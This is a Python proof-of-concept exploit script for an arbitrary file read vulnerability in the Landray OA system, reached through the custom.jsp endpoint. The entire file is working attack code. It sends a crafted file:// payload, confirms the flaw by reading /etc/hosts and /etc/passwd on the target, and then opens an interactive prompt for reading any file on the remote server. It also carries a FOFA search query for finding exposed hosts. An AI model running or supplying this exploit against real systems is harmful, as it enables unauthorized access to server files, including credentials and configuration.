#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author  : Cr4y0n
# @Software: PyCharm
# @Time    : 2021/5/8
# @Github  : https://github.com/Cr4y0nXX

import json
import requests
from argparse import ArgumentParser

requests.packages.urllib3.disable_warnings()

class EXP:
    def __init__(self):
        self.banner()
        self.args = self.parseArgs()
        self.url = self.args.url
        print("timeout:", self.args.timeout)
        self.hasVuln = False
        self.exploit()

    def banner(self):
        logo = r"""
     _                     _                ______               _  ___             ______ _ _      
    | |                   | |               | ___ \             | |/ _ \            |  ___(_) |     
    | |     __ _ _ __   __| |_ __ __ _ _   _| |_/ /___  __ _  __| / /_\ \_ __  _   _| |_   _| | ___ 
    | |    / _` | '_ \ / _` | '__/ _` | | | |    // _ \/ _` |/ _` |  _  | '_ \| | | |  _| | | |/ _ \
    | |___| (_| | | | | (_| | | | (_| | |_| | |\ \  __/ (_| | (_| | | | | | | | |_| | |   | | |  __/
    \_____/\__,_|_| |_|\__,_|_|  \__,_|\__, \_| \_\___|\__,_|\__,_\_| |_/_| |_|\__, \_|   |_|_|\___|  POC
                                        __/ |                                   __/ |               
                                       |___/                                   |___/       Author: Cr4y0n
        """
        msg = """
==================================================
| 漏洞名称 | 蓝凌OA系统存在任意文件读取漏洞
| 漏洞时间 | 2021-05-01
| 影响版本 | 当前全版本？
| 漏洞文件 | custom.jsp
| 默认路径 | /sys/ui/extend/varkind/custom.jsp
| FOFA语句 | app="Landray-OA系统"
==================================================
        """
        print("\033[91m" + logo + "\033[0m")
        print(msg)

    def parseArgs(self):
        parser = ArgumentParser()
        parser.add_argument("-u", "--url", required=True, type=str, help=f"The target address, (ip:port) or url")
        parser.add_argument("-t", "--timeout", required=False, type=int, default=3,  help="request timeout(default 3)")
        return parser.parse_args()

    # 验证漏洞
    def verify(self):
        self.url = self.url.replace("http://", "") if "http://" in self.url else self.url
        self.url = self.url.replace("https://", "") if "https://" in self.url else self.url
        repData = self.readFile("/etc/hosts")
        if "127.0.0.1" in repData:
            msg = f"\033[32m[+] [ Vuln ]  {self.url}\033[0m"
            self.hasVuln = True
        elif "Conn" == repData:
            msg = f"\033[31m[!] [ Conn ]  {self.url}\033[0m"
        else:
            repData = self.readFile("/etc/passwd")
            if "root" in repData:
                msg = f"\033[32m[+] [ Vuln ]  {self.url}\033[0m"
                self.hasVuln = True
            elif "Conn" == repData:
                msg = f"\033[31m[!] [ Conn ]  {self.url}\033[0m"
            else:
                msg = f"[-] [ Safe ]  {self.url}"
        print(msg)

    # 读取文件
    def readFile(self, filename):
        reqURL = "http://" + self.url + "/sys/ui/extend/varkind/custom.jsp"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        postData = 'var={"body":{"file":"file://' + filename + '"}}'
        try:
            rep = requests.post(url=reqURL, headers=headers, data=postData, timeout=self.args.timeout)
            fileData = rep.text
            return fileData
        except:
            return "Conn"

    # 攻击
    def exploit(self):
        self.verify()
        if self.hasVuln:
            while True:
                try:
                    remoteFile = input("\033[42m" + "Input File/Path>" + "\033[0m" + " ")
                    resultData = self.readFile(remoteFile)
                    if "操作失败" not in resultData:
                        print("\n", resultData.strip(), "\n")
                    else:
                        print("\nError.\n")
                except KeyboardInterrupt:
                    print("\n\nBye~\n")
                    return
                except:
                    print("\nError.\n")

if __name__ == "__main__":
    EXP()


